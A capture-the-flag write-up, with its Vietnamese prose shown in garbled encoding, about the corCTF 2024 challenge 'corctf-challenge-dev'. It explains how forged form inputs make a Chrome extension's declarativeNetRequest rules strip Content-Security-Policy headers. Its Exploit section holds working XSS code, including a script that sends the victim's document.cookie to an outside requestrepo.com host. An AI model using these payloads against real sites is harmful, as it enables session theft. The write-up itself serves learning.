---
title: corctf-challenge-dev
description: ''
tags:
  - writeup
  - xss
  - rce
  - lfi
  - csp
  - file-upload
category: web
draft: false
ctf_event: Corctf2024
date: 2023-07-04
---

import Callout from '@/components/mdx/Callout.astro';

Status: Done

## Summary

<Callout type="note" title="Note">
üí° Bypass CSP by overwriting extension rules via `declarativeNetRequest`.

</Callout>

## Description

1. Install Chrome:

   `npx @puppeteer/browsers install chrome@stable`

2. Start Chrome with the extension:

   `~/chrome/linux-127.0.6533.72/chrome-linux64/chrome --disable-extensions-except=./extension/ --load=extension=./extension/`

3. Reset the environment:

   `rm -rf ~/.config/google-chrome-for-testing/`

   Test v·ªõi bot local:

   ![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled.png)

## Analyst

- D·ªÖ nh√¨n th·∫•y ƒëo·∫°n code vuln XSS. Tuy nhi√™n ph·∫ßn CSP r·∫•t kh√≥ ƒë·ªÉ bypass.
- √ù t∆∞·ªüng kh√° l·∫° c·ªßa b√†i n√†y l√† khi bot visit URL s·∫Ω load extension ƒë∆∞·ª£c setup ·ªü manifest.
- File manifest nh∆∞ sau:

![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled-1.png)

- C√≥ t·ªïng c·ªông 3 file JS, trong ƒë√≥ ta s·∫Ω t·∫≠p trung ph√¢n t√≠ch 2 file.
- ƒê·∫ßu ti√™n l√† file `form_handler.js`:

![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled-2.png)

- Hi·ªÉu qua th√¨ file n√†y s·∫Ω t·∫°o ra 1 th·∫ª `div` sau ƒë√≥ insert v√†o `document.body`.
- ƒêi·ªÅu hay ·ªü ƒë√¢y l√† trong th·∫ª `div` c√≥ 1 th·∫ª `button`. Khi th·∫ª n√†y ƒë∆∞·ª£c click th√¨ n√≥ s·∫Ω l·∫•y c√°c thu·ªôc t√≠nh trong th·∫ª `block-options`, th·ª±c hi·ªán serialize v√† merge v·ªõi `base_rule`. M√† `base_rule` l√† rule extension ƒë∆∞·ª£c set trong `localStorage`.
- File th·ª© 2 l√† `req_handler.js`:

![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled-3.png)

- Hi·ªÉu qua file n√†y th√¨ m·ªói khi 1 tab ƒë∆∞·ª£c load m·ªõi th√¨ s·∫Ω `registerRules()` v√† sau ƒë√≥ s·∫Ω set rule v√†o `declarativeNetRequest`.
- ƒê·ªëi v·ªõi `declarativeNetRequest` th√¨ c√≥ 1 thu·ªôc t√≠nh `type` l√† `modifyHeaders` c√≥ th·ªÉ s·ª≠ d·ª•ng ƒë·ªÉ t·∫Øt CSP,‚Ä¶ T·ª´ ƒë√≥ c√≥ th·ªÉ th·ª±c hi·ªán ƒë∆∞·ª£c XSS. https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest
- √ù t∆∞·ªüng: vi·∫øt m·ªôt server ƒë·ªÉ th√™m c√°c th·∫ª `input` v√†o th·∫ª `div` trong `#condition`. Sau ƒë√≥ click button ƒë·ªÉ `localStorage` set l·∫°i c√°c rule, t·∫Øt CSP. T·ª´ ƒë√≥ load l·∫°i web v√† th·ª±c hi·ªán XSS ƒë·ªçc `document.cookie`.

![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled-4.png)

## Exploit

```html
<script>
        const w = window.open("/")
        w.onload = () => {
            window.location = "https://3nis2z6r.requestrepo.com" + "?" + w.document.cookie
        }
</script>
```

```html
<iframe src="http://localhost:8080/challenge/0333fd79ac4e"></iframe>
<script>
  const sleep = (s) => new Promise((r) => setTimeout(r, s))
  document.addEventListener("DOMContentLoaded", async () => {
    await sleep(1000)
    const condition = document.querySelector("#condition")
    const form = document.querySelector("#submit-btn")

    function createRules(name, value) {
      const inp1 = document.createElement("input")
      inp1.name = name
      inp1.value = value
      condition.appendChild(inp1)
    }

    condition.innerHTML = ""

    const STAGE_MAPPINGS = [
      ["priority", "1"],
      ["action.type", "modifyHeaders"],
      ["action.requestHeaders.0.header", "content-security-policy-report-only"],
      ["action.requestHeaders.0.operation", "remove"],
      ["action.responseHeaders.0.header", "Content-Security-Policy"],
      ["action.responseHeaders.0.operation", "remove"],
      ["condition.urlFilter", "*"],
      ["condition.initiatorDomains.0", "127.0.0.1"],
      ["condition.initiatorDomains.1", "webhook.site"],
      ["condition.initiatorDomains.2", "localhost"],
      ["condition.resourceTypes.0", "main_frame"],
      ["condition.resourceTypes.1", "sub_frame"],
    ]
    for (const i in STAGE_MAPPINGS) {
      const st = STAGE_MAPPINGS[i]
      createRules(st[0], st[1])
    }

    // Dispatch the click event
    form.dispatchEvent(new Event('click'))
    await sleep(2000)
    location.reload()
  })
</script>
```

## Result

![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled-5.png)

ƒê·ªçc ƒë·ªÉ hi·ªÉu k·ªπ h∆°n v·ªÅ b√†i https://cor.team/posts/corctf-2024-corctf-challenge-dev/
